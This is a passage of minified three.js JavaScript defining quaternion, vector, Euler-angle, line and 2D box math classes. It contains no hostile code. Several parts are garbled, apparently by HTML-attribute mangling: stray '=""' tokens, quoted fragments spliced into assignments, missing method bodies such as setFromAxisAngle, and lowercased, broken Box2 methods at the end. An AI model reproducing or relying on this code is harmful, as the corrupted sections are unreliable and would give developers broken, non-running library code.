k?(this._x=\"f*d*e+c*g*h,this._y=c*g*e-f*d*h,this._z=c*d*h-f*g*e,this._w=c*d*e+f*g*h):\"ZXY\"===k?(this._x=f*d*e-c*g*h,this._y=c*g*e+f*d*h,this._z=c*d*h+f*g*e,this._w=c*d*e-f*g*h):\"ZYX\"===k?(this._x=f*d*e-c*g*h,this._y=c*g*e+f*d*h,this._z=c*d*h-f*g*e,this._w=c*d*e+f*g*h):\"YZX\"===k?(this._x=f*d*e+c*g*h,this._y=c*g*e+f*d*h,this._z=c*d*h-f*g*e,this._w=c*d*e-f*g*h):\"XZY\"===k&&(this._x=f*d*e-c*g*h,this._y=c*g*e-f*d*h,this._z=c*d*h+f*g*e,this._w=c*d*e+f*g*h);if(!1!==b)this.onChangeCallback();return\" this},setfromaxisangle:function(a,=\"\" b){var=\"\" this},setfromrotationmatrix:function(a){var=\"\" b=\"a.elements,c=b[0];a=b[4];var\">f&&c>b?(c=2*Math.sqrt(1+c-f-b),this._w=(k-g)/c,this._x=.25*c,this._y=(a+e)/c,this._z=(d+h)/c):f>b?(c=2*Math.sqrt(1+f-c-b),this._w=(d-h)/c,this._x=(a+e)/c,this._y=\n.25*c,this._z=(g+k)/c):(c=2*Math.sqrt(1+b-c-f),this._w=(e-a)/c,this._x=(d+h)/c,this._y=(g+k)/c,this._z=.25*c);this.onChangeCallback();return this},setFromUnitVectors:function(){var a,b;return function(c,d){void 0===a&&(a=new THREE.Vector3);b=c.dot(d)+1;1E-6>b?(b=0,Math.abs(c.x)>Math.abs(c.z)?a.set(-c.y,c.x,0):a.set(0,-c.z,c.y)):a.crossVectors(c,d);this._x=a.x;this._y=a.y;this._z=a.z;this._w=b;return this.normalize()}}(),inverse:function(){return this.conjugate().normalize()},conjugate:function(){this._x*=\n-1;this._y*=-1;this._z*=-1;this.onChangeCallback();return this},dot:function(a){return this._x*a._x+this._y*a._y+this._z*a._z+this._w*a._w},lengthSq:function(){return this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w},length:function(){return Math.sqrt(this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w)},normalize:function(){var a=this.length();0===a?(this._z=this._y=this._x=0,this._w=1):(a=1/a,this._x*=a,this._y*=a,this._z*=a,this._w*=a);this.onChangeCallback();return this},\nmultiply:function(a,b){return void 0!==b?(console.warn(\"THREE.Quaternion: .multiply() now only accepts one argument. Use .multiplyQuaternions( a, b ) instead.\"),this.multiplyQuaternions(a,b)):this.multiplyQuaternions(this,a)},premultiply:function(a){return this.multiplyQuaternions(a,this)},multiplyQuaternions:function(a,b){var c=a._x,d=a._y,e=a._z,f=a._w,g=b._x,h=b._y,k=b._z,l=b._w;this._x=c*l+f*g+d*k-e*h;this._y=d*l+f*h+e*g-c*k;this._z=e*l+f*k+c*h-d*g;this._w=f*l-c*g-d*h-e*k;this.onChangeCallback();\nreturn this},slerp:function(a,b){if(0===b)return this;if(1===b)return this.copy(a);var c=this._x,d=this._y,e=this._z,f=this._w,g=f*a._w+c*a._x+d*a._y+e*a._z;0>g?(this._w=-a._w,this._x=-a._x,this._y=-a._y,this._z=-a._z,g=-g):this.copy(a);if(1<=g)return this._w=\"f,this._x=c,this._y=d,this._z=e,this;var\" h=\"Math.sqrt(1-g*g);if(.001\">Math.abs(h))return this._w=.5*(f+this._w),this._x=.5*(c+this._x),this._y=.5*(d+this._y),this._z=.5*(e+this._z),this;var k=Math.atan2(h,g),g=Math.sin((1-b)*k)/h,h=Math.sin(b*\nk)/h;this._w=f*g+this._w*h;this._x=c*g+this._x*h;this._y=d*g+this._y*h;this._z=e*g+this._z*h;this.onChangeCallback();return this},equals:function(a){return a._x===this._x&&a._y===this._y&&a._z===this._z&&a._w===this._w},fromArray:function(a,b){void 0===b&&(b=0);this._x=a[b];this._y=a[b+1];this._z=a[b+2];this._w=a[b+3];this.onChangeCallback();return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this._x;a[b+1]=this._y;a[b+2]=this._z;a[b+3]=this._w;return a},onChange:function(a){this.onChangeCallback=\na;return this},onChangeCallback:function(){}};\nObject.assign(THREE.Quaternion,{slerp:function(a,b,c,d){return c.copy(a).slerp(b,d)},slerpFlat:function(a,b,c,d,e,f,g){var h=c[d+0],k=c[d+1],l=c[d+2];c=c[d+3];d=e[f+0];var n=e[f+1],p=e[f+2];e=e[f+3];if(c!==e||h!==d||k!==n||l!==p){f=1-g;var m=h*d+k*n+l*p+c*e,q=0<=m?1:-1,r=1-m*m;r>Number.EPSILON&&(r=Math.sqrt(r),m=Math.atan2(r,m*q),f=Math.sin(f*m)/r,g=Math.sin(g*m)/r);q*=g;h=h*f+d*q;k=k*f+n*q;l=l*f+p*q;c=c*f+e*q;f===1-g&&(g=1/Math.sqrt(h*h+k*k+l*l+c*c),h*=g,k*=g,l*=g,c*=g)}a[b]=h;a[b+1]=k;a[b+2]=l;\na[b+3]=c}});THREE.Vector2=function(a,b){this.x=a||0;this.y=b||0};\nTHREE.Vector2.prototype={constructor:THREE.Vector2,get width(){return this.x},set width(a){this.x=a},get height(){return this.y},set height(a){this.y=a},set:function(a,b){this.x=a;this.y=b;return this},setScalar:function(a){this.y=this.x=a;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setComponent:function(a,b){switch(a){case 0:this.x=b;break;case 1:this.y=b;break;default:throw Error(\"index is out of range: \"+a);}},getComponent:function(a){switch(a){case 0:return this.x;\ncase 1:return this.y;default:throw Error(\"index is out of range: \"+a);}},clone:function(){return new this.constructor(this.x,this.y)},copy:function(a){this.x=a.x;this.y=a.y;return this},add:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector2: .add() now only accepts one argument. Use .addVectors( a, b ) instead.\"),this.addVectors(a,b);this.x+=a.x;this.y+=a.y;return this},addScalar:function(a){this.x+=a;this.y+=a;return this},addVectors:function(a,b){this.x=a.x+b.x;this.y=a.y+b.y;return this},\naddScaledVector:function(a,b){this.x+=a.x*b;this.y+=a.y*b;return this},sub:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector2: .sub() now only accepts one argument. Use .subVectors( a, b ) instead.\"),this.subVectors(a,b);this.x-=a.x;this.y-=a.y;return this},subScalar:function(a){this.x-=a;this.y-=a;return this},subVectors:function(a,b){this.x=a.x-b.x;this.y=a.y-b.y;return this},multiply:function(a){this.x*=a.x;this.y*=a.y;return this},multiplyScalar:function(a){isFinite(a)?(this.x*=a,\nthis.y*=a):this.y=this.x=0;return this},divide:function(a){this.x/=a.x;this.y/=a.y;return this},divideScalar:function(a){return this.multiplyScalar(1/a)},min:function(a){this.x=Math.min(this.x,a.x);this.y=Math.min(this.y,a.y);return this},max:function(a){this.x=Math.max(this.x,a.x);this.y=Math.max(this.y,a.y);return this},clamp:function(a,b){this.x=Math.max(a.x,Math.min(b.x,this.x));this.y=Math.max(a.y,Math.min(b.y,this.y));return this},clampScalar:function(){var a,b;return function(c,d){void 0===\na&&(a=new THREE.Vector2,b=new THREE.Vector2);a.set(c,c);b.set(d,d);return this.clamp(a,b)}}(),clampLength:function(a,b){var c=this.length();return this.multiplyScalar(Math.max(a,Math.min(b,c))/c)},floor:function(){this.x=Math.floor(this.x);this.y=Math.floor(this.y);return this},ceil:function(){this.x=Math.ceil(this.x);this.y=Math.ceil(this.y);return this},round:function(){this.x=Math.round(this.x);this.y=Math.round(this.y);return this},roundToZero:function(){this.x=0>this.x?Math.ceil(this.x):Math.floor(this.x);\nthis.y=0>this.y?Math.ceil(this.y):Math.floor(this.y);return this},negate:function(){this.x=-this.x;this.y=-this.y;return this},dot:function(a){return this.x*a.x+this.y*a.y},lengthSq:function(){return this.x*this.x+this.y*this.y},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)},normalize:function(){return this.divideScalar(this.length())},angle:function(){var a=Math.atan2(this.y,this.x);0>a&&(a+=2*Math.PI);return a},\ndistanceTo:function(a){return Math.sqrt(this.distanceToSquared(a))},distanceToSquared:function(a){var b=this.x-a.x;a=this.y-a.y;return b*b+a*a},setLength:function(a){return this.multiplyScalar(a/this.length())},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=(a.y-this.y)*b;return this},lerpVectors:function(a,b,c){return this.subVectors(b,a).multiplyScalar(c).add(a)},equals:function(a){return a.x===this.x&&a.y===this.y},fromArray:function(a,b){void 0===b&&(b=0);this.x=a[b];this.y=a[b+1];return this},\ntoArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this.x;a[b+1]=this.y;return a},fromAttribute:function(a,b,c){void 0===c&&(c=0);b=b*a.itemSize+c;this.x=a.array[b];this.y=a.array[b+1];return this},rotateAround:function(a,b){var c=Math.cos(b),d=Math.sin(b),e=this.x-a.x,f=this.y-a.y;this.x=e*c-f*d+a.x;this.y=e*d+f*c+a.y;return this}};THREE.Vector3=function(a,b,c){this.x=a||0;this.y=b||0;this.z=c||0};\nTHREE.Vector3.prototype={constructor:THREE.Vector3,set:function(a,b,c){this.x=a;this.y=b;this.z=c;return this},setScalar:function(a){this.z=this.y=this.x=a;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setZ:function(a){this.z=a;return this},setComponent:function(a,b){switch(a){case 0:this.x=b;break;case 1:this.y=b;break;case 2:this.z=b;break;default:throw Error(\"index is out of range: \"+a);}},getComponent:function(a){switch(a){case 0:return this.x;case 1:return this.y;\ncase 2:return this.z;default:throw Error(\"index is out of range: \"+a);}},clone:function(){return new this.constructor(this.x,this.y,this.z)},copy:function(a){this.x=a.x;this.y=a.y;this.z=a.z;return this},add:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .add() now only accepts one argument. Use .addVectors( a, b ) instead.\"),this.addVectors(a,b);this.x+=a.x;this.y+=a.y;this.z+=a.z;return this},addScalar:function(a){this.x+=a;this.y+=a;this.z+=a;return this},addVectors:function(a,\nb){this.x=a.x+b.x;this.y=a.y+b.y;this.z=a.z+b.z;return this},addScaledVector:function(a,b){this.x+=a.x*b;this.y+=a.y*b;this.z+=a.z*b;return this},sub:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .sub() now only accepts one argument. Use .subVectors( a, b ) instead.\"),this.subVectors(a,b);this.x-=a.x;this.y-=a.y;this.z-=a.z;return this},subScalar:function(a){this.x-=a;this.y-=a;this.z-=a;return this},subVectors:function(a,b){this.x=a.x-b.x;this.y=a.y-b.y;this.z=a.z-b.z;return this},\nmultiply:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .multiply() now only accepts one argument. Use .multiplyVectors( a, b ) instead.\"),this.multiplyVectors(a,b);this.x*=a.x;this.y*=a.y;this.z*=a.z;return this},multiplyScalar:function(a){isFinite(a)?(this.x*=a,this.y*=a,this.z*=a):this.z=this.y=this.x=0;return this},multiplyVectors:function(a,b){this.x=a.x*b.x;this.y=a.y*b.y;this.z=a.z*b.z;return this},applyEuler:function(){var a;return function(b){!1===b instanceof THREE.Euler&&\nconsole.error(\"THREE.Vector3: .applyEuler() now expects an Euler rotation rather than a Vector3 and order.\");void 0===a&&(a=new THREE.Quaternion);return this.applyQuaternion(a.setFromEuler(b))}}(),applyAxisAngle:function(){var a;return function(b,c){void 0===a&&(a=new THREE.Quaternion);return this.applyQuaternion(a.setFromAxisAngle(b,c))}}(),applyMatrix3:function(a){var b=this.x,c=this.y,d=this.z;a=a.elements;this.x=a[0]*b+a[3]*c+a[6]*d;this.y=a[1]*b+a[4]*c+a[7]*d;this.z=a[2]*b+a[5]*c+a[8]*d;return this},\napplyMatrix4:function(a){var b=this.x,c=this.y,d=this.z;a=a.elements;this.x=a[0]*b+a[4]*c+a[8]*d+a[12];this.y=a[1]*b+a[5]*c+a[9]*d+a[13];this.z=a[2]*b+a[6]*c+a[10]*d+a[14];return this},applyProjection:function(a){var b=this.x,c=this.y,d=this.z;a=a.elements;var e=1/(a[3]*b+a[7]*c+a[11]*d+a[15]);this.x=(a[0]*b+a[4]*c+a[8]*d+a[12])*e;this.y=(a[1]*b+a[5]*c+a[9]*d+a[13])*e;this.z=(a[2]*b+a[6]*c+a[10]*d+a[14])*e;return this},applyQuaternion:function(a){var b=this.x,c=this.y,d=this.z,e=a.x,f=a.y,g=a.z;a=\na.w;var h=a*b+f*d-g*c,k=a*c+g*b-e*d,l=a*d+e*c-f*b,b=-e*b-f*c-g*d;this.x=h*a+b*-e+k*-g-l*-f;this.y=k*a+b*-f+l*-e-h*-g;this.z=l*a+b*-g+h*-f-k*-e;return this},project:function(){var a;return function(b){void 0===a&&(a=new THREE.Matrix4);a.multiplyMatrices(b.projectionMatrix,a.getInverse(b.matrixWorld));return this.applyProjection(a)}}(),unproject:function(){var a;return function(b){void 0===a&&(a=new THREE.Matrix4);a.multiplyMatrices(b.matrixWorld,a.getInverse(b.projectionMatrix));return this.applyProjection(a)}}(),\ntransformDirection:function(a){var b=this.x,c=this.y,d=this.z;a=a.elements;this.x=a[0]*b+a[4]*c+a[8]*d;this.y=a[1]*b+a[5]*c+a[9]*d;this.z=a[2]*b+a[6]*c+a[10]*d;return this.normalize()},divide:function(a){this.x/=a.x;this.y/=a.y;this.z/=a.z;return this},divideScalar:function(a){return this.multiplyScalar(1/a)},min:function(a){this.x=Math.min(this.x,a.x);this.y=Math.min(this.y,a.y);this.z=Math.min(this.z,a.z);return this},max:function(a){this.x=Math.max(this.x,a.x);this.y=Math.max(this.y,a.y);this.z=\nMath.max(this.z,a.z);return this},clamp:function(a,b){this.x=Math.max(a.x,Math.min(b.x,this.x));this.y=Math.max(a.y,Math.min(b.y,this.y));this.z=Math.max(a.z,Math.min(b.z,this.z));return this},clampScalar:function(){var a,b;return function(c,d){void 0===a&&(a=new THREE.Vector3,b=new THREE.Vector3);a.set(c,c,c);b.set(d,d,d);return this.clamp(a,b)}}(),clampLength:function(a,b){var c=this.length();return this.multiplyScalar(Math.max(a,Math.min(b,c))/c)},floor:function(){this.x=Math.floor(this.x);this.y=\nMath.floor(this.y);this.z=Math.floor(this.z);return this},ceil:function(){this.x=Math.ceil(this.x);this.y=Math.ceil(this.y);this.z=Math.ceil(this.z);return this},round:function(){this.x=Math.round(this.x);this.y=Math.round(this.y);this.z=Math.round(this.z);return this},roundToZero:function(){this.x=0>this.x?Math.ceil(this.x):Math.floor(this.x);this.y=0>this.y?Math.ceil(this.y):Math.floor(this.y);this.z=0>this.z?Math.ceil(this.z):Math.floor(this.z);return this},negate:function(){this.x=-this.x;this.y=\n-this.y;this.z=-this.z;return this},dot:function(a){return this.x*a.x+this.y*a.y+this.z*a.z},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)},normalize:function(){return this.divideScalar(this.length())},setLength:function(a){return this.multiplyScalar(a/this.length())},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=\n(a.y-this.y)*b;this.z+=(a.z-this.z)*b;return this},lerpVectors:function(a,b,c){return this.subVectors(b,a).multiplyScalar(c).add(a)},cross:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .cross() now only accepts one argument. Use .crossVectors( a, b ) instead.\"),this.crossVectors(a,b);var c=this.x,d=this.y,e=this.z;this.x=d*a.z-e*a.y;this.y=e*a.x-c*a.z;this.z=c*a.y-d*a.x;return this},crossVectors:function(a,b){var c=a.x,d=a.y,e=a.z,f=b.x,g=b.y,h=b.z;this.x=d*h-e*g;this.y=e*f-c*h;\nthis.z=c*g-d*f;return this},projectOnVector:function(a){var b=a.dot(this)/a.lengthSq();return this.copy(a).multiplyScalar(b)},projectOnPlane:function(){var a;return function(b){void 0===a&&(a=new THREE.Vector3);a.copy(this).projectOnVector(b);return this.sub(a)}}(),reflect:function(){var a;return function(b){void 0===a&&(a=new THREE.Vector3);return this.sub(a.copy(b).multiplyScalar(2*this.dot(b)))}}(),angleTo:function(a){a=this.dot(a)/Math.sqrt(this.lengthSq()*a.lengthSq());return Math.acos(THREE.Math.clamp(a,\n-1,1))},distanceTo:function(a){return Math.sqrt(this.distanceToSquared(a))},distanceToSquared:function(a){var b=this.x-a.x,c=this.y-a.y;a=this.z-a.z;return b*b+c*c+a*a},setFromSpherical:function(a){var b=Math.sin(a.phi)*a.radius;this.x=b*Math.sin(a.theta);this.y=Math.cos(a.phi)*a.radius;this.z=b*Math.cos(a.theta);return this},setFromMatrixPosition:function(a){return this.setFromMatrixColumn(a,3)},setFromMatrixScale:function(a){var b=this.setFromMatrixColumn(a,0).length(),c=this.setFromMatrixColumn(a,\n1).length();a=this.setFromMatrixColumn(a,2).length();this.x=b;this.y=c;this.z=a;return this},setFromMatrixColumn:function(a,b){if(\"number\"===typeof a){console.warn(\"THREE.Vector3: setFromMatrixColumn now expects ( matrix, index ).\");var c=a;a=b;b=c}return this.fromArray(a.elements,4*b)},equals:function(a){return a.x===this.x&&a.y===this.y&&a.z===this.z},fromArray:function(a,b){void 0===b&&(b=0);this.x=a[b];this.y=a[b+1];this.z=a[b+2];return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===\nb&&(b=0);a[b]=this.x;a[b+1]=this.y;a[b+2]=this.z;return a},fromAttribute:function(a,b,c){void 0===c&&(c=0);b=b*a.itemSize+c;this.x=a.array[b];this.y=a.array[b+1];this.z=a.array[b+2];return this}};THREE.Vector4=function(a,b,c,d){this.x=a||0;this.y=b||0;this.z=c||0;this.w=void 0!==d?d:1};\nTHREE.Vector4.prototype={constructor:THREE.Vector4,set:function(a,b,c,d){this.x=a;this.y=b;this.z=c;this.w=d;return this},setScalar:function(a){this.w=this.z=this.y=this.x=a;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setZ:function(a){this.z=a;return this},setW:function(a){this.w=a;return this},setComponent:function(a,b){switch(a){case 0:this.x=b;break;case 1:this.y=b;break;case 2:this.z=b;break;case 3:this.w=b;break;default:throw Error(\"index is out of range: \"+\na);}},getComponent:function(a){switch(a){case 0:return this.x;case 1:return this.y;case 2:return this.z;case 3:return this.w;default:throw Error(\"index is out of range: \"+a);}},clone:function(){return new this.constructor(this.x,this.y,this.z,this.w)},copy:function(a){this.x=a.x;this.y=a.y;this.z=a.z;this.w=void 0!==a.w?a.w:1;return this},add:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector4: .add() now only accepts one argument. Use .addVectors( a, b ) instead.\"),this.addVectors(a,b);\nthis.x+=a.x;this.y+=a.y;this.z+=a.z;this.w+=a.w;return this},addScalar:function(a){this.x+=a;this.y+=a;this.z+=a;this.w+=a;return this},addVectors:function(a,b){this.x=a.x+b.x;this.y=a.y+b.y;this.z=a.z+b.z;this.w=a.w+b.w;return this},addScaledVector:function(a,b){this.x+=a.x*b;this.y+=a.y*b;this.z+=a.z*b;this.w+=a.w*b;return this},sub:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector4: .sub() now only accepts one argument. Use .subVectors( a, b ) instead.\"),this.subVectors(a,b);this.x-=\na.x;this.y-=a.y;this.z-=a.z;this.w-=a.w;return this},subScalar:function(a){this.x-=a;this.y-=a;this.z-=a;this.w-=a;return this},subVectors:function(a,b){this.x=a.x-b.x;this.y=a.y-b.y;this.z=a.z-b.z;this.w=a.w-b.w;return this},multiplyScalar:function(a){isFinite(a)?(this.x*=a,this.y*=a,this.z*=a,this.w*=a):this.w=this.z=this.y=this.x=0;return this},applyMatrix4:function(a){var b=this.x,c=this.y,d=this.z,e=this.w;a=a.elements;this.x=a[0]*b+a[4]*c+a[8]*d+a[12]*e;this.y=a[1]*b+a[5]*c+a[9]*d+a[13]*e;this.z=\na[2]*b+a[6]*c+a[10]*d+a[14]*e;this.w=a[3]*b+a[7]*c+a[11]*d+a[15]*e;return this},divideScalar:function(a){return this.multiplyScalar(1/a)},setAxisAngleFromQuaternion:function(a){this.w=2*Math.acos(a.w);var b=Math.sqrt(1-a.w*a.w);1E-4>b?(this.x=1,this.z=this.y=0):(this.x=a.x/b,this.y=a.y/b,this.z=a.z/b);return this},setAxisAngleFromRotationMatrix:function(a){var b,c,d;a=a.elements;var e=a[0];d=a[4];var f=a[8],g=a[1],h=a[5],k=a[9];c=a[2];b=a[6];var l=a[10];if(.01>Math.abs(d-g)&&.01>Math.abs(f-c)&&.01>\nMath.abs(k-b)){if(.1>Math.abs(d+g)&&.1>Math.abs(f+c)&&.1>Math.abs(k+b)&&.1>Math.abs(e+h+l-3))return this.set(1,0,0,0),this;a=Math.PI;e=(e+1)/2;h=(h+1)/2;l=(l+1)/2;d=(d+g)/4;f=(f+c)/4;k=(k+b)/4;e>h&&e>l?.01>e?(b=0,d=c=.707106781):(b=Math.sqrt(e),c=d/b,d=f/b):h>l?.01>h?(b=.707106781,c=0,d=.707106781):(c=Math.sqrt(h),b=d/c,d=k/c):.01>l?(c=b=.707106781,d=0):(d=Math.sqrt(l),b=f/d,c=k/d);this.set(b,c,d,a);return this}a=Math.sqrt((b-k)*(b-k)+(f-c)*(f-c)+(g-d)*(g-d));.001>Math.abs(a)&&(a=1);this.x=(b-k)/\na;this.y=(f-c)/a;this.z=(g-d)/a;this.w=Math.acos((e+h+l-1)/2);return this},min:function(a){this.x=Math.min(this.x,a.x);this.y=Math.min(this.y,a.y);this.z=Math.min(this.z,a.z);this.w=Math.min(this.w,a.w);return this},max:function(a){this.x=Math.max(this.x,a.x);this.y=Math.max(this.y,a.y);this.z=Math.max(this.z,a.z);this.w=Math.max(this.w,a.w);return this},clamp:function(a,b){this.x=Math.max(a.x,Math.min(b.x,this.x));this.y=Math.max(a.y,Math.min(b.y,this.y));this.z=Math.max(a.z,Math.min(b.z,this.z));\nthis.w=Math.max(a.w,Math.min(b.w,this.w));return this},clampScalar:function(){var a,b;return function(c,d){void 0===a&&(a=new THREE.Vector4,b=new THREE.Vector4);a.set(c,c,c,c);b.set(d,d,d,d);return this.clamp(a,b)}}(),floor:function(){this.x=Math.floor(this.x);this.y=Math.floor(this.y);this.z=Math.floor(this.z);this.w=Math.floor(this.w);return this},ceil:function(){this.x=Math.ceil(this.x);this.y=Math.ceil(this.y);this.z=Math.ceil(this.z);this.w=Math.ceil(this.w);return this},round:function(){this.x=\nMath.round(this.x);this.y=Math.round(this.y);this.z=Math.round(this.z);this.w=Math.round(this.w);return this},roundToZero:function(){this.x=0>this.x?Math.ceil(this.x):Math.floor(this.x);this.y=0>this.y?Math.ceil(this.y):Math.floor(this.y);this.z=0>this.z?Math.ceil(this.z):Math.floor(this.z);this.w=0>this.w?Math.ceil(this.w):Math.floor(this.w);return this},negate:function(){this.x=-this.x;this.y=-this.y;this.z=-this.z;this.w=-this.w;return this},dot:function(a){return this.x*a.x+this.y*a.y+this.z*\na.z+this.w*a.w},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)+Math.abs(this.w)},normalize:function(){return this.divideScalar(this.length())},setLength:function(a){return this.multiplyScalar(a/this.length())},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=(a.y-this.y)*b;this.z+=(a.z-\nthis.z)*b;this.w+=(a.w-this.w)*b;return this},lerpVectors:function(a,b,c){return this.subVectors(b,a).multiplyScalar(c).add(a)},equals:function(a){return a.x===this.x&&a.y===this.y&&a.z===this.z&&a.w===this.w},fromArray:function(a,b){void 0===b&&(b=0);this.x=a[b];this.y=a[b+1];this.z=a[b+2];this.w=a[b+3];return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this.x;a[b+1]=this.y;a[b+2]=this.z;a[b+3]=this.w;return a},fromAttribute:function(a,b,c){void 0===c&&(c=0);b=b*a.itemSize+\nc;this.x=a.array[b];this.y=a.array[b+1];this.z=a.array[b+2];this.w=a.array[b+3];return this}};THREE.Euler=function(a,b,c,d){this._x=a||0;this._y=b||0;this._z=c||0;this._order=d||THREE.Euler.DefaultOrder};THREE.Euler.RotationOrders=\"XYZ YZX ZXY XZY YXZ ZYX\".split(\" \");THREE.Euler.DefaultOrder=\"XYZ\";\nTHREE.Euler.prototype={constructor:THREE.Euler,get x(){return this._x},set x(a){this._x=a;this.onChangeCallback()},get y(){return this._y},set y(a){this._y=a;this.onChangeCallback()},get z(){return this._z},set z(a){this._z=a;this.onChangeCallback()},get order(){return this._order},set order(a){this._order=a;this.onChangeCallback()},set:function(a,b,c,d){this._x=a;this._y=b;this._z=c;this._order=d||this._order;this.onChangeCallback();return this},clone:function(){return new this.constructor(this._x,\nthis._y,this._z,this._order)},copy:function(a){this._x=a._x;this._y=a._y;this._z=a._z;this._order=a._order;this.onChangeCallback();return this},setFromRotationMatrix:function(a,b,c){var d=THREE.Math.clamp,e=a.elements;a=e[0];var f=e[4],g=e[8],h=e[1],k=e[5],l=e[9],n=e[2],p=e[6],e=e[10];b=b||this._order;\"XYZ\"===b?(this._y=Math.asin(d(g,-1,1)),.99999>Math.abs(g)?(this._x=Math.atan2(-l,e),this._z=Math.atan2(-f,a)):(this._x=Math.atan2(p,k),this._z=0)):\"YXZ\"===b?(this._x=Math.asin(-d(l,-1,1)),.99999>Math.abs(l)?\n(this._y=Math.atan2(g,e),this._z=Math.atan2(h,k)):(this._y=Math.atan2(-n,a),this._z=0)):\"ZXY\"===b?(this._x=Math.asin(d(p,-1,1)),.99999>Math.abs(p)?(this._y=Math.atan2(-n,e),this._z=Math.atan2(-f,k)):(this._y=0,this._z=Math.atan2(h,a))):\"ZYX\"===b?(this._y=Math.asin(-d(n,-1,1)),.99999>Math.abs(n)?(this._x=Math.atan2(p,e),this._z=Math.atan2(h,a)):(this._x=0,this._z=Math.atan2(-f,k))):\"YZX\"===b?(this._z=Math.asin(d(h,-1,1)),.99999>Math.abs(h)?(this._x=Math.atan2(-l,k),this._y=Math.atan2(-n,a)):(this._x=\n0,this._y=Math.atan2(g,e))):\"XZY\"===b?(this._z=Math.asin(-d(f,-1,1)),.99999>Math.abs(f)?(this._x=Math.atan2(p,k),this._y=Math.atan2(g,a)):(this._x=Math.atan2(-l,e),this._y=0)):console.warn(\"THREE.Euler: .setFromRotationMatrix() given unsupported order: \"+b);this._order=b;if(!1!==c)this.onChangeCallback();return this},setFromQuaternion:function(){var a;return function(b,c,d){void 0===a&&(a=new THREE.Matrix4);a.makeRotationFromQuaternion(b);return this.setFromRotationMatrix(a,c,d)}}(),setFromVector3:function(a,\nb){return this.set(a.x,a.y,a.z,b||this._order)},reorder:function(){var a=new THREE.Quaternion;return function(b){a.setFromEuler(this);return this.setFromQuaternion(a,b)}}(),equals:function(a){return a._x===this._x&&a._y===this._y&&a._z===this._z&&a._order===this._order},fromArray:function(a){this._x=a[0];this._y=a[1];this._z=a[2];void 0!==a[3]&&(this._order=a[3]);this.onChangeCallback();return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this._x;a[b+1]=this._y;a[b+2]=this._z;\na[b+3]=this._order;return a},toVector3:function(a){return a?a.set(this._x,this._y,this._z):new THREE.Vector3(this._x,this._y,this._z)},onChange:function(a){this.onChangeCallback=a;return this},onChangeCallback:function(){}};THREE.Line3=function(a,b){this.start=void 0!==a?a:new THREE.Vector3;this.end=void 0!==b?b:new THREE.Vector3};\nTHREE.Line3.prototype={constructor:THREE.Line3,set:function(a,b){this.start.copy(a);this.end.copy(b);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.start.copy(a.start);this.end.copy(a.end);return this},center:function(a){return(a||new THREE.Vector3).addVectors(this.start,this.end).multiplyScalar(.5)},delta:function(a){return(a||new THREE.Vector3).subVectors(this.end,this.start)},distanceSq:function(){return this.start.distanceToSquared(this.end)},distance:function(){return this.start.distanceTo(this.end)},\nat:function(a,b){var c=b||new THREE.Vector3;return this.delta(c).multiplyScalar(a).add(this.start)},closestPointToPointParameter:function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(c,d){a.subVectors(c,this.start);b.subVectors(this.end,this.start);var e=b.dot(b),e=b.dot(a)/e;d&&(e=THREE.Math.clamp(e,0,1));return e}}(),closestPointToPoint:function(a,b,c){a=this.closestPointToPointParameter(a,b);c=c||new THREE.Vector3;return this.delta(c).multiplyScalar(a).add(this.start)},applyMatrix4:function(a){this.start.applyMatrix4(a);\nthis.end.applyMatrix4(a);return this},equals:function(a){return a.start.equals(this.start)&&a.end.equals(this.end)}};THREE.Box2=function(a,b){this.min=void 0!==a?a:new THREE.Vector2(Infinity,Infinity);this.max=void 0!==b?b:new THREE.Vector2(-Infinity,-Infinity)};\nTHREE.Box2.prototype={constructor:THREE.Box2,set:function(a,b){this.min.copy(a);this.max.copy(b);return this},setFromPoints:function(a){this.makeEmpty();for(var b=0,c=a.length;b<c;b++)this.expandbypoint(a[b]);return this},setfromcenterandsize:function(){var=\"\" a=\"new\" three.vector2;return=\"\" function(b,c){var=\"\" d=\"a.copy(c).multiplyScalar(.5);this.min.copy(b).sub(d);this.max.copy(b).add(d);return\" this}}(),clone:function(){return(new=\"\" this.constructor).copy(this)},copy:function(a){this.min.copy(a.min);this.max.copy(a.max);=\"\" return=\"\" this},makeempty:function(){this.min.x=\"this.min.y=Infinity;this.max.x=this.max.y=-Infinity;return\" this},isempty:function(){return=\"\" this.max.x<this.min.x||this.max.y<this.min.y},center:function(a){return(a||new=\"\" three.vector2).addvectors(this.min,this.max).multiplyscalar(.5)},size:function(a){return(a||new=\"\" three.vector2).subvectors(this.max,this.min)},expandbypoint:function(a){this.min.min(a);this.max.max(a);return=\"\" 